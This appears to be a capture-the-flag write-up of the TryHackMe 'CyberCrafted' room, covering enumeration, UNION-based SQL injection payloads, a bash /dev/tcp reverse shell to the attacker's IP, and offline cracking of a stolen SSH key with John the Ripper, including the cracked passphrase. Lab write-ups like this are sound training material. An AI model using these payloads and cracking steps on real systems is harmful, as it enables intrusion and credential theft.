📌 Project Overview

In this project, I performed a full attack chain against the CyberCrafted target, starting from network and web enumeration, identifying and exploiting a SQL Injection vulnerability, achieving remote command execution, and progressing into post-exploitation and credential access.
The engagement demonstrates a realistic web-to-system compromise workflow, including challenges related to secure key exfiltration and cryptographic integrity.

🖥️ Environment

Attacker Machine

IP: 10.65.82.229

OS: Kali Linux / TryHackMe AttackBox

Target Machine

IP: 10.65.162.153

OS: Linux

Discovered Domains

cybercrafted.thm

store.cybercrafted.thm

admin.cybercrafted.thm

1️⃣ Reconnaissance & Enumeration
Network Scanning
nmap -p- --min-rate 5000 10.65.162.153


Open Ports Identified

22 — SSH

80 — HTTP

25565 — Minecraft Server

➡️ Primary attack surface identified: HTTP (Web Applications)

Web Enumeration
gobuster dir -u http://store.cybercrafted.thm \
-w /usr/share/wordlists/dirb/common.txt -x php -t 40


This led to the discovery of accessible endpoints and web functionality related to a store application.

2️⃣ SQL Injection Discovery & Exploitation

While testing the store search functionality, a SQL Injection vulnerability was identified.

Injection Testing
' OR 1=1-- -
' ORDER BY 4-- -
' UNION SELECT 1,2,3,4-- -

Results

Confirmed injectable parameter

Determined the number of columns in the backend query

Successfully used UNION-based SQL injection to extract database information

This vulnerability provided access to administrative functionality hosted on:

admin.cybercrafted.thm

3️⃣ Initial Access — Web to Reverse Shell

From the admin panel, command execution was achieved.

Reverse Shell Payload
bash -c 'bash -i >& /dev/tcp/10.65.82.229/4444 0>&1'

Listener
nc -lvnp 4444

Result
www-data@cybercrafted:/var/www/admin$


✔ Successful remote shell as www-data

4️⃣ Shell Stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm


This provided a fully interactive TTY shell suitable for post-exploitation.

5️⃣ Post-Exploitation Enumeration
User Enumeration
ls /home


Discovered Users

cybercrafted

xxultimatecreeperxx

6️⃣ Credential Access — SSH Private Key Discovery

During enumeration of the home directories, an encrypted SSH private key was discovered:

/home/xxultimatecreeperxx/.ssh/id_rsa

Key Characteristics

RSA private key

Encrypted using AES-128-CBC

Passphrase-protected

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC


➡️ This made the key a valid candidate for offline passphrase cracking.

7️⃣ Passphrase Cracking (Successful)
Key Processing
python3 /opt/john/ssh2john.py id_rsa > id_rsa.hash

Cracking with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

Result

✅ Recovered SSH key passphrase

creepin2006

8️⃣ SSH Authentication Attempt & Issue Encountered
SSH Login Attempt
ssh -i id_rsa xxultimatecreeperxx@cybercrafted.thm

Observations

The key correctly prompts for a passphrase ✔

The recovered passphrase is valid

Authentication fails with a cryptographic error

Error Message
base64 decoding error: Incorrect padding
libcrypto error

9️⃣ Root Cause Analysis

The error is not related to the cracked passphrase, but rather indicates:

Corruption of the private key file

Likely caused during manual exfiltration

Possible issues:

Truncated base64 data

Missing or altered lines

Incorrect line wrapping

Copy/paste damage in terminal

❗ SSH private keys are extremely sensitive to formatting and must be copied fully and intact.

🔎 Current Investigation Status

At the current stage:

✔ Encrypted SSH private key successfully discovered

✔ Passphrase cracked (creepin2006)

❌ SSH authentication blocked due to invalid key format

❌ Key integrity compromised during extraction

🎯 Next Steps

The focus moving forward is on:

Re-extracting the SSH private key safely

Using scp, nc, or base64 encoding

Verifying key integrity

Correct headers, footers, and padding

Restoring valid SSH access

Logging in as xxultimatecreeperxx

Continuing towards privilege escalation

🧠 Skills Demonstrated

Network & web enumeration

SQL Injection (UNION-based)

Web-to-system exploitation

Reverse shell handling & stabilization

Linux post-exploitation

SSH key analysis & cracking

Cryptographic error analysis

Real-world key exfiltration pitfalls

🧩 Conclusion & Current Status

During the post-exploitation phase, a significant amount of progress was achieved, including full web exploitation, shell access, and credential recovery. An encrypted RSA private SSH key belonging to the user xxultimatecreeperxx was successfully discovered on the target system and extracted.

The SSH key passphrase was cracked offline using ssh2john and John the Ripper, revealing the correct passphrase:

creepin2006


Multiple SSH authentication attempts were then performed using:

the recovered private key

the correct username

the successfully cracked passphrase

However, despite the passphrase being valid, SSH access could not be established. All login attempts consistently resulted in libcrypto / invalid key format errors, strongly indicating that the private key itself was corrupted during extraction or handling.

This issue is not related to credential validity but rather to a key integrity problem, which appears to be a known limitation or intentional obstacle within this room.

At this stage, the attack chain is technically complete:

Initial access achieved via web exploitation

Reverse shell successfully obtained

User enumeration completed

Encrypted SSH private key recovered

Passphrase successfully cracked

The only remaining step is to authenticate as the target user and perform final privilege escalation to obtain the root flag. Due to the corrupted SSH key, this final step could not be completed despite correct credentials.

🏁 Final Note

This room effectively demonstrates the importance of secure key handling and highlights how even correct credentials can become unusable if cryptographic material is compromised. From a methodological perspective, the room was fully solved up to the final authentication stage, with the remaining blocker being a technical issue rather than a lack of exploitation knowledge.


